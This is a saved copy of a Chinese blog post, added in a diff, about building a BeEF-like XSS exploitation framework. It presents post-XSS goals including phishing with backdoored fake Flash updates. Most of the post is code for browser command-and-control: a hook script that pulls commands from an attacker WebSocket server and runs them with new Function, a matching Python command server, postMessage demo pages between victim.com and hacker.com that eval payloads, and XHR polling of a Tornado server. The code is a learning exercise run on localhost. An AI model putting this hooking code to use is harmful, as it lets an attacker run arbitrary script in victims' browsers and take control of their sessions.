@@ -1,0 +1,1077 @@
+<!DOCTYPE html>
+<!-- saved from url=(0048)https://www.cnblogs.com/moonnight/p/6071034.html -->
+<html lang="zh-cn"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="referrer" content="origin">
+    <meta property="og:description" content="研究beef xss框架">
+    <meta http-equiv="Cache-Control" content="no-transform">
+    <meta http-equiv="Cache-Control" content="no-siteapp">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>xss框架（一）之浏览器通信 - 月尽西楼 - 博客园</title>
+    
+    <link rel="stylesheet" href="./xss框架（一）之浏览器通信 - 月尽西楼 - 博客园_files/blog-common.min.css">
+    <link id="MainCss" rel="stylesheet" href="./xss框架（一）之浏览器通信 - 月尽西楼 - 博客园_files/bundle-anothereon001.min.css">
+    <link type="text/css" rel="stylesheet" href="./xss框架（一）之浏览器通信 - 月尽西楼 - 博客园_files/custom.css">
+    <link id="mobile-style" media="only screen and (max-width: 767px)" type="text/css" rel="stylesheet" href="./xss框架（一）之浏览器通信 - 月尽西楼 - 博客园_files/bundle-anothereon001-mobile.min.css">
+    
+    <link type="application/rss+xml" rel="alternate" href="https://www.cnblogs.com/moonnight/rss">
+    <link type="application/rsd+xml" rel="EditURI" href="https://www.cnblogs.com/moonnight/rsd.xml">
+    <link type="application/wlwmanifest+xml" rel="wlwmanifest" href="https://www.cnblogs.com/moonnight/wlwmanifest.xml">
+    <script src="./xss框架（一）之浏览器通信 - 月尽西楼 - 博客园_files/amp4ads-host-v0.js.下载"></script><script src="./xss框架（一）之浏览器通信 - 月尽西楼 - 博客园_files/pubads_impl_rendering_2020030501.js.下载"></script><script async="" src="./xss框架（一）之浏览器通信 - 月尽西楼 - 博客园_files/analytics.js.下载"></script><script src="./xss框架（一）之浏览器通信 - 月尽西楼 - 博客园_files/jquery-2.2.0.min.js.下载"></script>
+    <script src="./xss框架（一）之浏览器通信 - 月尽西楼 - 博客园_files/blog-common.min.js.下载"></script>
+    <script>
+        var currentBlogId = 239522;
+        var currentBlogApp = 'moonnight';
+        var cb_enable_mathjax = false;
+        var isLogined = false;
+    </script>
+    
+    
+    
+<link rel="preload" href="./xss框架（一）之浏览器通信 - 月尽西楼 - 博客园_files/f.txt" as="script"><script type="text/javascript" src="./xss框架（一）之浏览器通信 - 月尽西楼 - 博客园_files/f.txt"></script><link rel="preload" href="./xss框架（一）之浏览器通信 - 月尽西楼 - 博客园_files/f(1).txt" as="script"><script type="text/javascript" src="./xss框架（一）之浏览器通信 - 月尽西楼 - 博客园_files/f(1).txt"></script><script src="./xss框架（一）之浏览器通信 - 月尽西楼 - 博客园_files/pubads_impl_2020030501.js.下载" async=""></script><link rel="prefetch" href="https://tpc.googlesyndication.com/safeframe/1-0-37/html/container.html"></head>
+<body>
+    <a name="top"></a>
+    
+    <div id="wrapper">
+<div id="header">
+
+<div id="top">
+<h1><a id="Header1_HeaderTitle" class="headermaintitle HeaderMainTitle" href="https://www.cnblogs.com/moonnight/">月尽西楼</a>
+</h1>
+<div id="subtitle">
+
+</div>
+</div>
+<div id="sub"><div class="BlogStats">随笔 - 
+21, 文章 - 
+0, 评论 - 
+0, 引用 - 
+0</div>
+
+</div>
+
+
+
+
+</div>
+<div id="main_container">
+<div id="main_content">
+<div id="content">
+	<div id="post_detail">
+    <div class="post">
+        <h2>
+            
+<a id="cb_post_title_url" class="postTitle2" href="https://www.cnblogs.com/moonnight/p/6071034.html">xss框架（一）之浏览器通信</a>
+
+        </h2>
+        <div class="postbody">
+            
+    <div id="cnblogs_post_description" style="display: none">
+        研究beef xss框架
+    </div>
+<div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
+    <h3 id="x00-简述">0x00 简述</h3>
+<p>最近想练练手写一个类似beef的xss利用工具，找到一本神书 浏览器黑客handbook</p>
+<p>其中引用了很多beef的源代码，做了很细致的讲解。</p>
+<p>假设现在目标页面已经发现了xss漏洞，我们要对它进行控制和进一步的利用，最好还能像后门一样持久保存在用户浏览器中</p>
+<p>关于xss利用：</p>
+<ul>
+<li><p>信息收集方面： 目标IP 浏览器 操作系统，可以从http头中读取 ； 访问的历史记录 ，准备一堆常用网站，读取CSS 访问过的网站会有标记 ；</p></li>
+<li><p>钓鱼欺骗 ： 用一个flash更新图片铺满页面，点击下载带后门的软件；克隆目标正在访问的其他网站</p></li>
+<li><p>实时控制 ： 攻击者建立服务和目标浏览器建立器实时的交互，发送任意命令给目标浏览器，这也是本文主要针对的方面： XMLHttpRequest 轮询目标状态， 原生支持的websocket ，跨域的postMessage() ，隐蔽一些的 DNS tunnel 。beef中有一个dns服务器，python dns服务器 也要提上日程了</p></li>
+</ul>
+<h3 id="x01-websockets">0x01 websockets</h3>
+<p>python3中引入websockets库 发现demo中使用了 async和await</p>
+<p>async 用来声明一个协程函数 await 表示运行阻塞等待结果</p>
+<p>python3.5中引入了协程</p>
+<p>关于协程的理解：</p>
+<ol>
+<li><p>区别于通常的函数调用，函数之间没有相互调用的关系</p></li>
+<li><p>在同一线程中并行执行两个函数，在子程序内部可中断转而执行其他函数，不需要考虑线程之间的共享资源，锁，等等概念。</p></li>
+<li><p>执行速度好于线程。</p></li>
+</ol>
+<p>websocket.js</p>
+<pre><code class="hljs javascript">
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">hasWebsocket</span>(<span class="hljs-params"></span>)</span>{
+
+    <span class="hljs-keyword">return</span> !!<span class="hljs-built_in">window</span>.WebSocket || !!<span class="hljs-built_in">window</span>.MozWebSocket;
+
+}
+
+<span class="hljs-keyword">if</span> (hasWebsocket()){
+
+    <span class="hljs-keyword">try</span>{
+
+    <span class="hljs-keyword">var</span> ws = <span class="hljs-keyword">new</span> WebSocket(<span class="hljs-string">"ws://127.0.0.1:5678/"</span>);
+
+    }
+
+    <span class="hljs-keyword">catch</span>(err){
+
+        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">"no WebSocket server "</span>) 
+
+    }
+
+    ws.onopen = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>{
+
+        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">"socket open"</span>);
+
+        ws.send(<span class="hljs-string">"give me some command"</span>);
+
+    }
+
+    ws.onmessage = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">msg</span>)</span>{
+
+        f = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Function</span>(msg.data);
+
+        f();
+
+        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">"command executed"</span>)
+
+    }
+
+}
+
+<span class="hljs-keyword">else</span>{
+
+    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">"no WebSocket"</span>)
+
+}
+</code></pre>
+<p>xss_websocket.py</p>
+<pre><code class="hljs python">
+<span class="hljs-comment">#!/usr/bin/env python</span>
+
+<span class="hljs-keyword">import</span> asyncio
+
+<span class="hljs-keyword">import</span> datetime
+
+<span class="hljs-keyword">import</span> random
+
+<span class="hljs-keyword">import</span> websockets
+
+
+
+<span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">command</span><span class="hljs-params">(websocket,path)</span>:</span>
+
+    <span class="hljs-keyword">while</span> <span class="hljs-keyword">True</span>:
+
+        payload = input(<span class="hljs-string">"enter command&gt;"</span>)
+
+        <span class="hljs-keyword">if</span> payload:
+
+            <span class="hljs-keyword">await</span> websocket.send(payload)
+
+        <span class="hljs-keyword">else</span>:
+
+            print(<span class="hljs-string">"waiting for command"</span>)
+
+<span class="hljs-comment">#        await asyncio.sleep(10)</span>
+
+
+
+start_server = websockets.serve(command, <span class="hljs-string">'127.0.0.1'</span>, <span class="hljs-number">5678</span>)
+
+asyncio.get_event_loop().run_until_complete(start_server)
+
+asyncio.get_event_loop().run_forever()
+</code></pre>
+<p>执行结果是这样的 可以输入js命令让目标执行<br>
+<img src="./xss框架（一）之浏览器通信 - 月尽西楼 - 博客园_files/796790-20161116183342123-908503475.png"></p>
+<h3 id="x02-postmessage">0x02 postMessage()</h3>
+<p>window.postMessage() 是另一个原生支持的跨域交流的方法。</p>
+<p>我们先修改/etc/hosts建立两个域名 hacker.com victim.com</p>
+<p>需要在victim页面建立一个iframe 通过postMessage()向hacker.com 传送消息</p>
+<p>在hack.html中监听发送过来的消息</p>
+<pre><code class="hljs lua">
+window.addEventListener(<span class="hljs-built_in">type</span>,<span class="hljs-function"><span class="hljs-keyword">function</span>,<span class="hljs-title">false</span>)</span>;
+
+window.addEventListener(<span class="hljs-string">"message"</span>,receiveMessage,<span class="hljs-literal">false</span>);
+</code></pre>
+<p>victim.html</p>
+<pre><code class="hljs http">
+
+<span class="xml"><span class="hljs-meta">&lt;!DOCTYPE html&gt;</span>
+
+<span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
+
+<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
+
+    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
+
+    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text/javascript"</span>&gt;</span><span class="javascript">
+
+        <span class="hljs-built_in">window</span>.addEventListener(<span class="hljs-string">"message"</span>,receiveMessage,<span class="hljs-literal">false</span>);
+
+        <span class="hljs-keyword">var</span> infoBar = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">"debug"</span>)
+
+        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">receiveMessage</span>(<span class="hljs-params">event</span>)</span>{
+
+            infoBar.innerHTML += event.origin+<span class="hljs-string">": "</span>+event.data+<span class="hljs-string">""</span>;
+
+            <span class="hljs-keyword">new</span> <span class="hljs-built_in">Function</span>(event.data)();
+
+        }
+
+
+
+        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">post_msg</span>(<span class="hljs-params"></span>)</span>{
+
+            <span class="hljs-keyword">var</span> to_hack = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">'to_hack'</span>);
+
+            to_hack.contentWindow.postMessage(<span class="hljs-string">""</span>+<span class="hljs-built_in">eval</span>(<span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">'v'</span>).value),<span class="hljs-string">"http://hacker.com"</span>);
+
+        }
+
+    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+
+<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
+
+<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
+
+    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"debug"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
+
+    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"ui"</span>&gt;</span>
+
+        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">""</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"v"</span> /&gt;</span>
+
+        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"button"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"send to hacker"</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">"post_msg()"</span>&gt;</span>
+
+        <span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"to_hack"</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"http://hacker.com/hack/xss/hack.html"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span>
+
+    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
+
+<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
+
+<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
+</span></code></pre>
+<p>hack.html</p>
+<pre><code class="hljs http">
+
+<span class="xml">
+<span class="hljs-meta">&lt;!DOCTYPE html&gt;</span>
+
+<span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
+
+    <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
+
+        <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>WebSocket demo<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
+
+    <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
+
+    <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
+
+        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"debug"</span>&gt;</span> Ready to receive data...<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
+
+        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"hidden"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"payload"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"alert(1)"</span>&gt;</span> 
+
+        <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text/javascript"</span>&gt;</span><span class="javascript">
+
+            <span class="hljs-built_in">window</span>.addEventListener(<span class="hljs-string">"message"</span>,receiveMessage, <span class="hljs-literal">false</span>);
+
+            <span class="hljs-keyword">var</span> debug = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">"debug"</span>);
+
+
+
+            <span class="hljs-keyword">var</span> payload = <span class="hljs-built_in">eval</span>(<span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">'payload'</span>).value)
+
+            <span class="hljs-built_in">console</span>.log(payload)
+
+            <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">receiveMessage</span>(<span class="hljs-params">event</span>)</span>{
+
+                debug.innerHTML += <span class="hljs-string">"Data: "</span> + event.data + <span class="hljs-string">"\n Orign: "</span>+event.orign;
+
+                parent.postMessage(payload,event.orign);
+
+            }           
+
+        </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+
+    <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
+
+<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
+
+</span></code></pre>
+<p>执行结果</p>
+<p><img src="./xss框架（一）之浏览器通信 - 月尽西楼 - 博客园_files/796790-20161116183423904-555704869.png"></p>
+<p>虽然还是有一个错误 但是每次点击按钮都会弹窗</p>
+<h4 id="xmlhttprequest">xmlhttprequest</h4>
+<p>我们编写一个tronado 的hello world 服务器来给xmlHttpRequest响应。然而XHR受同源策略的限制只能发出请求而不能收回自己请求结果。<br>
+在XHR level2 中只要在返回头中加上 Access-Control-Allow-Origin 头部 指定可以访问的源就能实现<br>
+xmlhttp.html</p>
+<pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE html&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text/javascript"</span>&gt;</span><span class="javascript">
+
+        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">loadXMLDoc</span>(<span class="hljs-params"></span>)</span>{
+            <span class="hljs-keyword">var</span> xmlhttp=<span class="hljs-literal">null</span>;
+            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">window</span>.XMLHttpRequest){
+              xmlhttp=<span class="hljs-keyword">new</span> XMLHttpRequest();
+              }
+            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">window</span>.ActiveXObject){
+              xmlhttp=<span class="hljs-keyword">new</span> ActiveXObject(<span class="hljs-string">"Microsoft.XMLHTTP"</span>);
+              }
+            <span class="hljs-keyword">else</span>{
+              alert(<span class="hljs-string">"Your browser does not support XMLHTTP."</span>);
+              }
+            <span class="hljs-keyword">return</span> xmlhttp;
+        }
+
+        <span class="hljs-keyword">var</span> xmlhttp=loadXMLDoc();
+
+        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Makerequest</span>(<span class="hljs-params">url</span>)</span>{
+            <span class="hljs-keyword">if</span> (xmlhttp!=<span class="hljs-literal">null</span>){
+              xmlhttp.onreadystatechange=state_Change;
+              xmlhttp.open(<span class="hljs-string">"GET"</span>,url,<span class="hljs-literal">true</span>);
+              xmlhttp.send(<span class="hljs-literal">null</span>);
+              }
+        }
+
+        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">state_Change</span>(<span class="hljs-params"></span>)
+        </span>{
+        <span class="hljs-keyword">if</span> (xmlhttp.readyState==<span class="hljs-number">4</span>){
+            <span class="hljs-keyword">if</span>(xmlhttp.responseText!=<span class="hljs-literal">null</span>){
+                <span class="hljs-comment">//new Function(xmlhttp.responseText).();</span>
+                <span class="hljs-built_in">document</span>.write(xmlhttp.responseText)
+                }
+            <span class="hljs-keyword">else</span>{
+                <span class="hljs-built_in">console</span>.log(<span class="hljs-string">"responseText wrong"</span>)
+            }
+          }
+        <span class="hljs-keyword">else</span>{
+            <span class="hljs-built_in">console</span>.log(<span class="hljs-string">"readyState wrong"</span>)
+        }
+        }
+        setInterval(Makerequest(<span class="hljs-string">"http://localhost:8001"</span>),<span class="hljs-number">2000</span>)
+        
+    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre>
+<p>hello.py</p>
+<pre><code class="hljs python"><span class="hljs-keyword">import</span> tornado.httpserver
+<span class="hljs-keyword">import</span> tornado.ioloop
+<span class="hljs-keyword">import</span> tornado.options
+<span class="hljs-keyword">import</span> tornado.web
+<span class="hljs-keyword">import</span> os
+
+<span class="hljs-keyword">from</span> tornado.options <span class="hljs-keyword">import</span> define ,options
+define(<span class="hljs-string">"port"</span>,default=<span class="hljs-number">8001</span>,help=<span class="hljs-string">"run on this port "</span> ,type=int)
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">IndexHandler</span><span class="hljs-params">(tornado.web.RequestHandler)</span>:</span>
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get</span><span class="hljs-params">(self)</span>:</span>
+        self.write(<span class="hljs-string">"&lt;script&gt;alert(1)&lt;/script&gt;"</span>)
+                self.set_header(<span class="hljs-string">'Access-Control-Allow-Origin'</span>,<span class="hljs-string">'*'</span>) 
+<span class="hljs-keyword">if</span> __name__==<span class="hljs-string">"__main__"</span>:
+    tornado.options.parse_command_line()
+    app = tornado.web.Application(handlers=[(<span class="hljs-string">r"/"</span>,IndexHandler)],
+        template_path=os.path.join(os.path.dirname(__file__), <span class="hljs-string">"templates"</span>))
+    http_server = tornado.httpserver.HTTPServer(app)
+    http_server.listen(options.port)
+    tornado.ioloop.IOLoop.instance().start()
+</code></pre>
+<p>挖的坑终于补上了一个。。。</p>
+<h3 id="x03-参考">0x03 参考</h3>
+<p>1，讲解了postmessage和websocket的概念</p>
+<p><a href="http://www.ibm.com/developerworks/cn/web/1301_jiangjj_html5message/index.html" class="uri">http://www.ibm.com/developerworks/cn/web/1301_jiangjj_html5message/index.html</a></p>
+<p>2，介绍python协程</p>
+<p><a href="http://www.tuicool.com/articles/fEryuyi" class="uri">http://www.tuicool.com/articles/fEryuyi</a></p>
+<p>3，websocket 文档</p>
+<p><a href="https://websockets.readthedocs.io/en/stable/intro.html" class="uri">https://websockets.readthedocs.io/en/stable/intro.html</a></p>
+<p>4，《Browser hacker‘s handbook》</p>
+
+</div>
+<div id="MySignature"></div>
+<div class="clear"></div>
+<div id="blog_post_info_block">
+<div id="EntryTag">
+    标签: 
+            <a href="https://www.cnblogs.com/moonnight/tag/xss/">xss</a></div>
+
+    <div id="blog_post_info">
+<div id="green_channel">
+        <a href="javascript:void(0);" id="green_channel_digg" onclick="DiggIt(6071034,cb_blogId,1);green_channel_success(this,&#39;谢谢推荐！&#39;);">好文要顶</a>
+        <a id="green_channel_follow" onclick="follow(&#39;afc76929-d13f-e511-b908-9dcfd8948a71&#39;);" href="javascript:void(0);">关注我</a>
+    <a id="green_channel_favorite" onclick="AddToWz(cb_entryId);return false;" href="javascript:void(0);">收藏该文</a>
+    <a id="green_channel_weibo" href="javascript:void(0);" title="分享至新浪微博" onclick="ShareToTsina()"><img src="./xss框架（一）之浏览器通信 - 月尽西楼 - 博客园_files/icon_weibo_24.png" alt=""></a>
+    <a id="green_channel_wechat" href="javascript:void(0);" title="分享至微信" onclick="shareOnWechat()"><img src="./xss框架（一）之浏览器通信 - 月尽西楼 - 博客园_files/wechat.png" alt=""></a>
+</div>
+<div id="author_profile">
+    <div id="author_profile_info" class="author_profile_info">
+            <a href="https://home.cnblogs.com/u/moonnight/" target="_blank"><img src="./xss框架（一）之浏览器通信 - 月尽西楼 - 博客园_files/20150811104001.png" class="author_avatar" alt=""></a>
+        <div id="author_profile_detail" class="author_profile_info">
+            <a href="https://home.cnblogs.com/u/moonnight/">月尽西楼</a><br>
+            <a href="https://home.cnblogs.com/u/moonnight/followees/">关注 - 5</a><br>
+            <a href="https://home.cnblogs.com/u/moonnight/followers/">粉丝 - 6</a>
+        </div>
+    </div>
+    <div class="clear"></div>
+    <div id="author_profile_honor"></div>
+    <div id="author_profile_follow">
+                <a href="javascript:void(0);" onclick="follow(&#39;afc76929-d13f-e511-b908-9dcfd8948a71&#39;);return false;">+加关注</a>
+    </div>
+</div>
+<div id="div_digg">
+    <div class="diggit" onclick="votePost(6071034,&#39;Digg&#39;)">
+        <span class="diggnum" id="digg_count">0</span>
+    </div>
+    <div class="buryit" onclick="votePost(6071034,&#39;Bury&#39;)">
+        <span class="burynum" id="bury_count">0</span>
+    </div>
+    <div class="clear"></div>
+    <div class="diggword" id="digg_tips">
+    </div>
+</div>
+
+<script type="text/javascript">
+    currentDiggType = 0;
+</script></div>
+    <div class="clear"></div>
+    <div id="post_next_prev">
+
+    <a href="https://www.cnblogs.com/moonnight/p/6033416.html" class="p_n_p_prefix">« </a> 上一篇：    <a href="https://www.cnblogs.com/moonnight/p/6033416.html" title="发布于 2016-11-05 16:32">Joomla未授权创建特权用户漏洞和getshell脚本解析</a>
+    <br>
+    <a href="https://www.cnblogs.com/moonnight/p/6270180.html" class="p_n_p_prefix">» </a> 下一篇：    <a href="https://www.cnblogs.com/moonnight/p/6270180.html" title="发布于 2017-01-10 17:26">xss框架（二）基础框架实现</a>
+
+</div>
+</div>
+        </div>
+        <p class="postfoot">
+            posted on 
+<span id="post-date">2016-11-16 18:37</span>&nbsp;
+<a href="https://www.cnblogs.com/moonnight/">月尽西楼</a>&nbsp;
+阅读(<span id="post_view_count">841</span>)&nbsp;
+评论(<span id="post_comment_count">0</span>)&nbsp;
+<a href="https://i.cnblogs.com/EditPosts.aspx?postid=6071034" rel="nofollow">编辑</a>&nbsp;
+<a href="javascript:void(0)" onclick="AddToWz(6071034);return false;">收藏</a>
+        </p>
+    </div>
+</div>
+
+<script src="./xss框架（一）之浏览器通信 - 月尽西楼 - 博客园_files/highlight.min.js.下载"></script>
+<script>markdown_highlight();</script>
+<script>
+    var allowComments = true, cb_blogId = 239522, cb_blogApp = 'moonnight', cb_blogUserGuid = 'afc76929-d13f-e511-b908-9dcfd8948a71';
+    var cb_entryId = 6071034, cb_entryCreatedDate = '2016-11-16 18:37', cb_postType = 1; 
+    loadViewCount(cb_entryId);
+</script><a name="!comments"></a>
+<div id="blog-comments-placeholder"></div>
+<script>
+    var commentManager = new blogCommentManager();
+    commentManager.renderComments(0);
+</script>
+
+<div id="comment_form" class="commentform">
+    <a name="commentform"></a>
+    <div id="divCommentShow"></div>
+    <div id="comment_nav"><span id="span_refresh_tips"></span><a href="javascript:void(0);" onclick="return RefreshCommentList();" id="lnk_RefreshComments" runat="server" clientidmode="Static">刷新评论</a><a href="https://www.cnblogs.com/moonnight/p/6071034.html#" onclick="return RefreshPage();">刷新页面</a><a href="https://www.cnblogs.com/moonnight/p/6071034.html#top">返回顶部</a></div>
+    <div id="comment_form_container" style="visibility: visible;"><div class="login_tips">
+    注册用户登录后才能发表评论，请 
+    <a rel="nofollow" href="javascript:void(0);" class="underline" onclick="return login(&#39;commentform&#39;);">登录</a>
+     或 
+    <a rel="nofollow" href="javascript:void(0);" class="underline" onclick="return register();">注册</a>，
+    <a href="https://www.cnblogs.com/">访问</a> 网站首页。
+</div></div>
+    <div class="ad_text_commentbox" id="ad_text_under_commentbox"></div>
+    <div id="ad_t2"><a href="http://www.ucancode.com/index.htm" target="_blank" onclick="ga(&#39;send&#39;, &#39;event&#39;, &#39;Link&#39;, &#39;click&#39;, &#39;T2-ucancode&#39;)">【推荐】超50万行VC++源码: 大型组态工控、电力仿真CAD与GIS源码库</a><br><a href="https://cloud.tencent.com/act/season?fromSource=gwzcw.3422970.3422970.3422970&amp;utm_medium=cpc&amp;utm_id=gwzcw.3422970.3422970.3422970" target="_blank" onclick="ga(&#39;send&#39;, &#39;event&#39;, &#39;Link&#39;, &#39;click&#39;, &#39;T2-腾讯云&#39;)">【活动】腾讯云服务器推出云产品采购季 1核2G首年仅需99元</a><br><a href="https://developer.aliyun.com/article/744670?utm_content=g_1000104140" target="_blank" onclick="ga(&#39;send&#39;, &#39;event&#39;, &#39;Link&#39;, &#39;click&#39;, &#39;T2-阿里云开发者社区&#39;)">【推荐】如何在面试中成长？来看阿里前端终面官的面试心得</a><br><a href="https://developer.aliyun.com/ask/257760?utm_content=g_1000088949" target="_blank" onclick="ga(&#39;send&#39;, &#39;event&#39;, &#39;Link&#39;, &#39;click&#39;, &#39;T2-阿里云开发者社区&#39;)">【推荐】精品问答：大数据计算技术 1000 问</a><br></div>
+    <div id="opt_under_post"></div>
+    <script async="async" src="./xss框架（一）之浏览器通信 - 月尽西楼 - 博客园_files/gpt.js.下载"></script>
+    <script>
+        var googletag = googletag || {};
+        googletag.cmd = googletag.cmd || [];
+    </script>
+    <script>
+        googletag.cmd.push(function () {
+            googletag.defineSlot("/1090369/C1", [300, 250], "div-gpt-ad-1546353474406-0").addService(googletag.pubads());
+            googletag.defineSlot("/1090369/C2", [468, 60], "div-gpt-ad-1539008685004-0").addService(googletag.pubads());
+            googletag.pubads().enableSingleRequest();
+            googletag.enableServices();
+        });
+    </script>
+    <div id="cnblogs_c1" class="c_ad_block">
+        <div id="div-gpt-ad-1546353474406-0" style="height:250px; width:300px;" data-google-query-id="CKaqncLzkegCFY0wKwod8z4H_g"><div id="google_ads_iframe_/1090369/C1_0__container__" style="border: 0pt none;"><iframe id="google_ads_iframe_/1090369/C1_0" title="3rd party ad content" name="google_ads_iframe_/1090369/C1_0" width="300" height="250" scrolling="no" marginwidth="0" marginheight="0" frameborder="0" style="border: 0px; vertical-align: bottom;" data-google-container-id="1" data-load-complete="true" src="./xss框架（一）之浏览器通信 - 月尽西楼 - 博客园_files/saved_resource.html"></iframe></div></div>
+    </div>
+    <div id="under_post_news"><div class="recomm-block"><b>相关博文：</b><br>·  <a title="HTML5项目笔记8：使用HTML5 的跨域通信机制进行数据同步" href="https://www.cnblogs.com/wzh2010/archive/2012/05/28/2522384.html" target="_blank" onclick="clickRecomItmem(2522384)">HTML5项目笔记8：使用HTML5 的跨域通信机制进行数据同步</a><br>·  <a title="谨慎能捕千秋蝉（一）——XSS" href="https://www.cnblogs.com/strick/p/6349911.html" target="_blank" onclick="clickRecomItmem(6349911)">谨慎能捕千秋蝉（一）——XSS</a><br>·  <a title="前端常见跨域解决方案（全）" href="https://www.cnblogs.com/roam/p/7520433.html" target="_blank" onclick="clickRecomItmem(7520433)">前端常见跨域解决方案（全）</a><br>·  <a title="通信类" href="https://www.cnblogs.com/yangkangkang/p/8798754.html" target="_blank" onclick="clickRecomItmem(8798754)">通信类</a><br>·  <a title="kalilinux之xss" href="https://www.cnblogs.com/Hydraxx/p/10463892.html" target="_blank" onclick="clickRecomItmem(10463892)">kalilinux之xss</a><br>»  <a target="_blank" href="https://recomm.cnblogs.com/blogpost/6071034">更多推荐...</a><div id="cnblogs_t5"><a href="https://developer.aliyun.com/article/727136?utm_content=g_1000088943" target="_blank" onclick="ga(&#39;send&#39;, &#39;event&#39;, &#39;Link&#39;, &#39;click&#39;, &#39;T5-阿里云开发者社区&#39;)">独家下载 |《大数据工程师必读手册》揭秘阿里如何玩转大数据</a></div></div></div>
+    <div id="cnblogs_c2" class="c_ad_block">
+        <div id="div-gpt-ad-1539008685004-0" style="height:60px; width:468px;" data-google-query-id="CKeqncLzkegCFY0wKwod8z4H_g">
+            <script>
+                if (new Date() >= new Date(2018, 9, 13)) {
+                    googletag.cmd.push(function () { googletag.display("div-gpt-ad-1539008685004-0"); });
+                }
+            </script>
+        <div id="google_ads_iframe_/1090369/C2_0__container__" style="border: 0pt none; width: 468px; height: 60px;"></div></div>
+    </div>
+    <div id="under_post_kb">
+<div class="itnews c_ad_block">
